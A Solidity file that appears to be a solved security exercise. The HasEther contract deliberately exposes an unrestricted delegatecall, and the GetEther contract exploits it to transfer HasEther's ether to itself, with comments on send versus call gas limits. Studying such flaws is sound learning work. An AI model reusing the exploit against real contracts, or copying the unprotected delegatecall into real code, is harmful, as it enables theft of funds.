// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.28;

import {console} from "forge-std/console.sol";

contract GetEther {
    // write any code you like inside this contract, but only this contract
    // get the Ether from the HasEther contract. You may not modify the test

    function getEther(HasEther hasEther) external {
        //...

      bytes memory data = abi.encodeWithSignature("fu(address)", address (this));

      try hasEther.action (address (this), data) {
        console.log ("@action success");
      } catch (bytes memory reason){
        console.log ("@action reverted:");
        console.logBytes (reason);
      }
    }

    // fu will be executed in the context of contract that delegates the call
    function fu (address payable to) public payable {

      // NOTE: why this fails?
      /* to.send (1 ether); */
      // EXPLANATION:
      /* 1. `send()` only forwards 2300 gas (not enough for the `receive()` function with logging) */
      /* 2. `call` forwards all available gas by default */

      (bool success, ) = to.call{value: 1 ether}("");
      require(success, "Transfer failed");
    }

    receive() external payable {
      // Handles plain Ether transfers
      console.log ("@receivedETH", msg.value);
    }

    /* fallback() external payable { */
    /*   uint256 t = msg.value; */
    /*   /\* console.log ("@gotETH", t); *\/ */
    /* } */

}

contract HasEther {

    error NotEnoughEther();

    constructor() payable {
        require(address(this).balance == 1 ether, NotEnoughEther());
    }

    function action(address to, bytes memory data) external {
        (bool success, ) = address(to).delegatecall(data);
        require(success, "Action failed");
    }
}
